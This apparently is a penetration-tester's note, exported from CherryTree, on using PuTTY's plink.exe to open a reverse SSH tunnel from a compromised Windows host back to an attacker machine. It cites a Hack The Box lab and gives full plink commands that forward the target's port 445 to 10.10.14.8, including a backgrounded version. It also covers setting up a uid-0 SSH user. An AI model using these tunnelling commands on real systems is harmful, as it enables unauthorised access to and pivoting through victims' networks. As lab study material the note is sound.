<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>plink.exe (Windows)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Port Forwarding - plink.exe (Windows)</h1></strong><br /><code>plink.exe</code> is part of PuTTY.<br />You can use it to establish an SSH tunnel back to your attacking machine.<br /><br /><strong>Examples</strong><br />â€¢ <em>hackthebox Chatterbox</em><br /><br /><strong><h2>## Set up SSH Tunnel<br /></h2></strong><strong><h3>Don&#39;t SSH as back to your box as root!</h3></strong><br />That would be unbelievably dumb. If discovered, your discoverer could ssh into your attacking box as root too and would have full control of your system. Don&#39;t ssh as root.<br /><br />Instead, allow for root login over ssh and create a new user on your attacking box that<br />1. isn&#39;t root <br />2. has root permissions - uid 0<br />3. can&#39;t execute commands - /bin/false<br /><br /><strong>1. Create new user and set password</strong><br /><code>useradd bob</code><br /><code>passwd bob</code> &gt; (set whatever password you want here)<br /><br /><strong>2. Stop new user from executing commands</strong><br /><code>nano /etc/passwd</code><br />Change <code>/bin/bash</code> shell to <code>/bin/false</code> so that it doesn&#39;t execute commands<br />Change UID and GID from <code>1001</code> to <code>0</code><br /><br /><strong>3. Allow root login over ssh</strong><br /><code>nano /etc/ssh/sshd_config</code><br /><code>PermitRootLogin yes</code><br /><code>service ssh restart</code><br /><br /><strong>3. Transfer plink.exe to the target</strong><br />Via whatever means you have<br /><br /><strong>4. Start ssh on attacker machine to receive ssh connection</strong><br /><code>service ssh start</code><br /><br /><strong><h2>## Remote Port Forward</h2></strong><br />Forward a local port to your attacking machine.<br /><br />1. Remote port forward<br /><em>Forward port 445 out to 10.10.14.8 and have it run on 127.0.0.1 port 445</em><br /><code>plink.exe -l &lt;user&gt; -pw &lt;passwd&gt; -R 445:127.0.0.1:445 10.10.14.8 -N</code><br /><br />2. Verify the port forward is open on your attacking machine<br /><code>netstat -panut</code><br /><br />If it isn&#39;t, just try the port forward again, and double check your user setup.<br />If you really can&#39;t get it to work, plink to your system as root (but this a pretty unsafe thing to do, avoid if you can).<br /><br /><strong><h3>### Run plink.exe in the background</h3></strong><br /><code>START /B</code> - the closest equivalent to <code>&amp;</code> on linux<br /><code>-N</code> tells plink not to start a shell after connecting to the system<br /><br /><code>START /B plink.exe -l &lt;user&gt; -pw &lt;passwd&gt; -R 445:127.0.0.1:445 10.10.14.8 -N</code><br /><br /><br /><br /><br /><br /></div>
</body>
</html>
